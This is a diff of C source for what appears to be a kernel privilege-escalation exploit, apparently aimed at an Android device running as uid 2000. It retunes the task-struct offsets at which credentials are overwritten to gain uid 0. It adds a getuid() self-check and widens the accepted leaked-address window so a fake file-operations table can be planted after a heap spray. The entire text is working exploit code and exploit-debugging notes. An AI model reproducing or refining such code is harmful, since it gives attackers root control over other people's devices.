@@ -34,11 +34,11 @@ uintptr_t binwrite_target;
  * traffic never sees the configfs read JT. */
 int g_swap_staged;
 long g_uid0_child_pid;
-/* cred-slot sweep (08-30 canary proof: store lands EXACTLY at the aimed
- * slot; +0x790 comm verified. +0x780 missed 18x => wrong slot for this
- * build. Candidates: Z29 family + runtime_struct_offsets family. */
-const uint64_t g_uid0_slot_candidates[] = {0x780, 0x780, 0x780, 0x780,
-                                           0x780, 0x780};
+/* cred-slot sweep (08-30 canary: store lands EXACTLY at the aimed slot.
+ * +0x790 comm verified. +0x780 is real_cred — getuid() stays 2000 (18x).
+ * Subjective cred is the qword immediately before comm: +0x788. */
+const uint64_t g_uid0_slot_candidates[] = {0x780, 0x788, 0x778, 0x780,
+                                           0x788, 0x778};
 const int g_uid0_slot_ncand = 6;
 int g_uid0_slot_idx;
 uintptr_t g_uid0_task_base;
@@ -85,6 +85,10 @@ uint32_t uid0_child_uid_beacon(void) {
 }
 
 uint32_t uid0_child_getuid_query(void) {
+  /* Self cred punch: getuid() is the only honest 0x780 signal. Status/CapEff
+   * and the child beacon stay 2000 (vendor get_task_cred reads real_cred). */
+  if (g_uid0_check_self)
+    return (uint32_t)getuid();
   uint32_t b = uid0_child_uid_beacon();
   if (b <= 2000)
     return b; /* beacon is live and authoritative */
@@ -2059,13 +2063,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
   /*
-   * Z7: KS returned 0xffffff8780e90000 (inside the 64GB DIRECT_MAP
-   * window, past real DRAM). Punch SOFTBOOT'd. Z4/Z6 parks lived on
-   * 0xffffff80xxxxxxxx (P0 of DRAM, ≤16GB from PAGE_OFFSET).
+   * Accept the 64GB linear map (ffffff80–ffffff90). The old 16GB clip
+   * (Z7) rejected ffffff89 mm after a prior spray — swap could never
+   * plant fake_fops. Z7 SOFTBOOT was using that page as waiter.lock;
+   * SLIDE_SWAP now pins lock/task to init_task BSS and only stores
+   * the leaked page as fake_fops (the table).
    */
   if (base < P0_PAGE_OFFSET ||
-      base >= (P0_PAGE_OFFSET + 0x400000000ULL)) {
-    pr_warning("KernelSnitch mm %016zx outside P0 DRAM window — retry\n",
+      base >= (uintptr_t)KERNELSNITCH_IDENTITY_END) {
+    pr_warning("KernelSnitch mm %016zx outside linear map — retry\n",
                base);
     kernelsnitch_cleanup(ks);
     ks = NULL;
